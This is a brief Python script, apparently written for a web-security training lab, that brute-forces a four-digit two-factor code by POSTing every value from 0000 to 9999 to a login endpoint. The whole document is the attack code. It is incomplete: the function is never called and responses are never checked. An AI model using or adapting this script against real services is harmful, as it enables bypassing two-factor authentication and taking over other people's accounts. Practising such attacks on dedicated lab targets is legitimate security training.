import requests

#2FA bypass using a brute-force attack


url = "https://0ae600eb04512fde826756550052001c.web-security-academy.net/login2"
data = {
    "mfa-code": 1511
}

def printx(data):
    for i1 in range(0, 10):
        for i2 in range(0, 10):
            for i3 in range(0, 10):
                for i4 in range(0, 10):
                    data['mfa-code'] = f"{i1}{i2}{i3}{i4}"
                    response = requests.post(url=url, data=data)


